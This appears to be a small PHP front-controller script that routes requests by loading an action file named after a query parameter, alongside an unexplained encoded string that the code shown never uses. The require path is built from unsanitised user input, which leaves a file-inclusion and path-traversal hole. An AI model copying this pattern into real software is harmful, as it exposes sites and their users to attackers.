<?php
//namespace PowerAuto;
$str='7aecKHCgcPbv%2BK8t0TM9WpqO15EYE%2B%2BMjJGZKOBM1Cbul8Dai5ECfLEHrEVYFUzrensQiAYGEFArOdTQWexCVRLiJy696BeynBbSwRtFHfbeybjlcznCxGwh%2BespLlU%2FH9RPYlcameI9STw';

$m=isset($_GET['m'])?strtolower($_GET['m']):'Index';

$a=isset($_GET['a'])?strtolower($_GET['a']):'index';

require dirname(__FILE__).'/action/' . $m . 'Action.php';

